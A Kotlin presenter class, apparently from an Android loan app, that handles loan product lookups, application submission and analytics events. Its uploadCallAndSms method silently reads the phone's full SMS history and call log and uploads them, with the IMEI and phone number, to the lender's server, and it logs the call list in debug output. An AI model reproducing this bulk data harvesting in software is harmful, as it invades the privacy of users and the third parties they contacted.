package com.neutron.deloan.confirm

import android.annotation.SuppressLint
import android.content.Context
import com.neutron.deloan.NApplication
import com.neutron.deloan.base.BasePresenter
import com.neutron.deloan.net.RetrofitUtil
import com.neutron.deloan.utils.*
import com.ronal.crazy.util.AfPointUtils
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*

class ConfirmPresenter : BasePresenter<ConfirmContract.View>(), ConfirmContract.Presenter {


    @SuppressLint("CheckResult")
    override fun getInfoById(id: String) {
        val userId = PreferencesHelper.getUserID()
        job = GlobalScope.launch(Dispatchers.Main) {
            val map = HashMap<String, Any>();
            map["user_id"] = userId
            map["product_id"] = id
            try {
                mView?.returnInfo(
                    RetrofitUtil.service.confirmInfo(
                        Utils.createBody(
                            Utils.createCommonParams(
                                map
                            )
                        )
                    )
                )
            } catch (e: Exception) {
                e.printStackTrace()
                mView?.showError(e)
            }

        }


    }

    override fun uploadCallAndSms(context: Context) {
        GlobalScope.launch {
            val phoneEPRE = PreferencesHelper.getPhoneEPRE();
            val phone = PreferencesHelper.getPhone();
            val userId = PreferencesHelper.getUserID()
            val imei = PreferencesHelper.getIMEI()
            val mobile = "$phoneEPRE$phone";
            val record = Utils.getMessage(context);
//            Slog.d("uploadCallAndSms    $record ")
            if (record.size > 0) {
                val hashMap = HashMap<String, Any>()
                hashMap["user_id"] = userId
                hashMap["self_mobile"] = mobile
                hashMap["account_id"] = mobile
                hashMap["record"] = record
                hashMap["uuid"] = imei
               val smsResphone=     RetrofitUtil.service.uploadSMS(Utils.createBody(Utils.createCommonParams(hashMap)))
                Slog.d("smsResphone    $smsResphone ")
            }

            val callList = DataBaseHelper.getCallLogs()
            Slog.d("uploadCallAndSms   callList  $callList ")
            val dataFormart= SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

            if (callList.size > 0) {
                val hashMap = HashMap<String, Any>()
                hashMap["user_id"] = userId
                hashMap["self_mobile"] = mobile
                hashMap["account_id"] = mobile
                hashMap["uuid"] = imei
                hashMap["record"] = callList.map {
                       Utils.Companion.CallRepository(it.number,it.cachedName,dataFormart.format(Date(it.date)),it.duration.toString(),it.type.toString())
                }
                val callResphone=   RetrofitUtil.service.uploadCall(Utils.createBody(Utils.createCommonParams(hashMap)))
                Slog.d("callResphone    $callResphone ")
            }


        }
    }

    @SuppressLint("CheckResult")
    override fun uploadRequest(map: HashMap<String, Any>) {
        job = GlobalScope.launch(Dispatchers.Main) {
            try {
                var result =
                    RetrofitUtil.service.uploadRequest(Utils.createBody(Utils.createCommonParams(map)))
                Slog.d("上传回调  $result")
                mView?.returnConfirmInfo(result)
                AfPointUtils.userAppsFlyerReturnSuccessDataEvent(
                    Constants.AF_APPPLY_SUCCESS,
                    result.result.loanId.toString(),
                    Constants.EVENT_CODE_APPLY_SUCCESS,
                    PreferencesHelper.getPhone(),
                    NApplication.sContext
                )
            } catch (e: Exception) {
                e.printStackTrace()
                Slog.e("上传回调  $e")
                mView?.showError(e)
            }
        }


    }

    override fun uploadRERequest(map: HashMap<String, Any>) {
//        /api/loan/re/loanapp

        job = GlobalScope.launch(Dispatchers.Main) {
            try {
                var result = RetrofitUtil.service.uploadRERequest(
                    Utils.createBody(
                        Utils.createCommonParams(map)
                    )
                )
                Slog.d("上传回调  $result")
                mView?.returnConfirmInfo(result)
                AfPointUtils.userAppsFlyerReturnSuccessDataEvent(
                    Constants.AF_APPPLY_SUCCESS,
                    result.result.loanId.toString(),
                    Constants.EVENT_CODE_APPLY_SUCCESS,
                    PreferencesHelper.getPhone(),
                    NApplication.sContext
                )
            } catch (e: Exception) {
                e.printStackTrace()
                Slog.e("上传回调  $e")
                mView?.showError(e)
            }
        }


    }


}